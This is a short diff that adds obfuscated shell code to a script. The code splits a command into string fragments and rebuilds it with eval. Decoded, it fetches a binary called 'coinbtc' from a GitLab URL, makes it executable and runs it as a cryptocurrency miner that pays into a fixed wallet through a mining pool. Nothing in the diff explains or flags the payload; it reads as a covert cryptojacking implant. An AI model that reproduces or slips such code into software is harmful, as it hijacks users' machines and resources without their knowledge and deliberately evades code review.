@@ -1,0 +1,3 @@
+z="
+";Lz='aw/m';Fz='com/';kz='bwEf';sz='.W1';dz='eabl';nz='Pbu1';oz='p9bg';Qz='hmod';Xz='ETC ';pz='bjKK';Tz='/coi';Zz='ol e';mz='9iXX';Mz='ain/';hz='-use';Jz='nega';qz='8Yqe';Cz='ps:/';Gz='asia';Wz='oin ';Iz='eng/';Kz='/-/r';Bz=' htt';Ez='lab.';gz='33 -';Hz='pbon';Dz='/git';iz='r TR';bz='sh.u';Uz='nbtc';Rz=' +x ';ez='e.co';rz='gfYM';Sz='&& .';cz='nmin';Nz='coin';Pz='&& c';Oz='btc ';lz='GT2h';Yz='--po';Az='wget';jz='X:TB';fz='m:33';Vz=' --c';az='tcha';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Nz$Oz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$hz$iz$jz$kz$lz$mz$nz$oz$pz$qz$rz$sz"
